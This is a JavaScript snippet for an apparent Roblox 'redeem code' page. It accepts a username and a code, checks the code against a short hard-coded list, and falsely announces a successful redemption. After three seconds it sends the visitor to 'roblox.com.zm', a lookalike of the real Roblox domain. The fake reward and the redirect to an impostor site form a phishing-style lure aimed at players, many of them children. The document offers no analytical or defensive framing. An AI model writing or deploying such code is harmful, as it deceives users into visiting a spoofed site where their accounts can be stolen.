document.getElementById('redeemButton').addEventListener('click', function() {
    const username = document.getElementById('usernameInput').value.trim();
    const code = document.getElementById('codeInput').value.trim();
    
    // Example codes
    const validCodes = ['RobloxMagic', 'Spicymagic', 'Skibiditoiletball2', 'Robuxball'];

    if (!username || !code) {
        document.getElementById('statusMessage').innerText = 'Please enter your username and the code!';
        document.getElementById('statusMessage').className = 'error';
        return;
    }

    if (!validCodes.includes(code)) {
        document.getElementById('statusMessage').innerText = 'Invalid code. Please try again!';
        document.getElementById('statusMessage').className = 'error';
        return;
    }

    // Display success message
    document.getElementById('statusMessage').innerText = 'Code redeemed successfully! Price is being opened. Please wait until the tab is opened.';
    document.getElementById('statusMessage').className = 'success';

    // Redirect to the new URL after a short delay
    setTimeout(() => {
        window.location.href = 'https://roblox.com.zm/users/9866254713/profile';
    }, 3000); // Redirects after 3 seconds
});
